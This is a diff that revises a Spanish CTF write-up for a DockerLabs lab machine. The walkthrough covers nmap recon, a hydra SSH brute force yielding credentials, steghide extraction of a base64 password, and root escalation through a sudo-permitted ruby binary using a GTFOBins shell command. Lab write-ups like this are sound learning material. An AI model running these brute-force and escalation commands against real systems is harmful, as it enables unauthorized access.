@@ -2,13 +2,14 @@ Propiedades:
 - OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
-- Tags: #hydra #brute-force #dockerlabs #esteganografia
+- Tags: #hydra #bruteforce #dockerlabs #esteganografia
  
 ![](assets/Pasted%20image%2020251105215000.png)
 
 ## Reconocimiento
 
-Comenzamos con un escaneo con nmap para listar los puertos abiertos
+Comenzamos con un escaneo con nmap para ver los puertos abiertos
+
 ```bash
 nmap -p- -sS -Pn -n --min-rate 5000 -oN ports.txt 172.17.0.3
 ---------------------------------------------------------------
@@ -23,7 +24,8 @@ MAC Address: 02:D1:20:12:D4:7B (Unknown)
 
 - Puerto 80 HTTP y 22 SSH abiertos
 
-Procedí con un segundo escaneo mas profundo para listar servicios y versiones
+Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.
+
 ```bash
 nmap -p 22,80 -Pn -n -sCV --min-rate 5000 -oN target.txt 172.17.0.3
 --------------------------------------------------------------------
@@ -45,19 +47,24 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - Puerto 22 SSH: OpenSSH 9.6p1 Ubuntu 3ubuntu13
 - Puerto 80 HTTP: Apache httpd 2.4.58
 
+## Enumeracion
 
-**Puerto 80 Apache**
-Al parecer es una simple pagina web con anuncios e informacion, no habia muchas cosas que llamaran mi atención, en su codigo fuente tampoco encontré nada.
+### **Puerto 80 Apache**
 
-- Veo el nombre de _carlota_ y _juan_ - Posibles nombres de usuario.
+Al parecer es una pagina web relacionada una empresa donde se publican noticias y otras cosas.
+
+- Lo único resaltable es este anuncion donde se me indican 2 posibles usuarios, **juan** y **carlota**
 
 ![](assets/Pasted%20image%2020251105215238.png)
 
+Esa es prácticamente toda la informacion que nos da la web.
+
 ## Explotación
 
-Como no tengo mucha informacion y solo tengo 2 posibles usuarios opte por realizar un ataque de fuerza bruta al servicio SSH usando hydra.
+Como no tengo mucha informacion y solo tengo 2 posibles usuarios opte por realizar un ataque de fuerza bruta usando `hydra` 
 
-- _babygirl_ fue la password encontrada para el usuario carlota
+- Probé con los 2 usuarios y finalmente fue el usuario **carlota** con el que conseguí credenciales validas.
+- carlota:babygirl
 
 ```bash
 > hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
@@ -65,7 +72,8 @@ Como no tengo mucha informacion y solo tengo 2 posibles usuarios opte por realiz
 [22][ssh] host: 172.17.0.3   login: carlota   password: babygirl
 ```
 
-Me conecto mediante SSH
+Me conecto mediante SSH.
+
 ```bash
 > ssh carlota@172.17.0.2
 ```
@@ -74,11 +82,12 @@ Me conecto mediante SSH
 ## Escalada de Privilegios
 
 Lo primero que veo es que existe una `imagen.jpg` en la ruta:
+
 ```
 > /home/carlota/Desktop/fotos/vacaciones/imagen.jpg
 ```
 
-Por lo cual decidí bajármela en mi maquina
+Por lo cual decidí bajármela la imagen en maquina.
 
 ```bash
 > scp carlota@172.17.0.3:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/wndr/Machines/DockerLabs/amor
@@ -86,7 +95,8 @@ Por lo cual decidí bajármela en mi maquina
 
 Decidí usar `stgehide` para ver posibles mensajes ocultos mediante esteganografía.
 
-- Me extrajo un archivo llamado secret.txt que al parecer es un mensaje codificado en _base64_
+- Me extrajo un archivo llamado secret.txt que al parecer es un mensaje codificado en **base64**
+
 ```bash
 > steghide --extract -sf imagen.jpg
 > cat secret.txt
@@ -94,29 +104,33 @@ Decidí usar `stgehide` para ver posibles mensajes ocultos mediante esteganograf
 ZXNsYWNhc2FkZXBpbnlwb24=
 ```
 
-Procedí a decodificar el texto
+Decodifico el mensaje y veo que me regresa un texto.
+
 ```bash
 > echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
 ----------------------------------------------------
 eslacasadepinypon
 ```
 
-Supuse que el texto era alguna contraseña o algo asi, asi que decidí apuntar al archivo _/etc/passwd_ para ver posibles usuarios disponibles.
+Supuse que el texto era alguna contraseña o algo asi, asi que decidí apuntar al archivo **/etc/passwd** para ver posibles usuarios disponibles.
+
 ```bash
 > cat /etc/passwd
 --------------------------------------
 oscar:x:1002:1002::/home/oscar:/bin/sh
 ```
 
-Encuentro el usuario oscar y decido migrar usando la contraseña anteriormente encontrada
 
-- oscar:eslacasadepinypon
+Trate de migrar al usuario oscar con las credenciales encontradas y tuve éxito.
+
+- oscar / eslacasadepinypon
 
 ```bash
 > su oscar
 ```
 
-Procedo a enumerar binarios con privilegios de SUDO:
+Siendo el usuario oscar procedí a enumerar binarios que pudiera ejecutar como el usuario `root`
+
 ```bash
 > sudo -l
 -----------------------------------------------------------
@@ -124,7 +138,9 @@ User oscar may run the following commands on a15681e926ec:
     (ALL) NOPASSWD: /usr/bin/ruby
 ```
 
-Descubrí el binario _ruby_ y decidí buscarlo en `gtfobins` para explotarlo
+- El binario `ruby` puede ser ejecutado como cualquier usuario sin necesidad de contraseña
+
+Con ayuda de [GTFOBins](https://gtfobins.github.io/gtfobins/ruby/) abuso del binario y migro al usuario root.
 
 ```bash
 > sudo -u root /usr/bin/ruby -e 'exec "/bin/bash"'
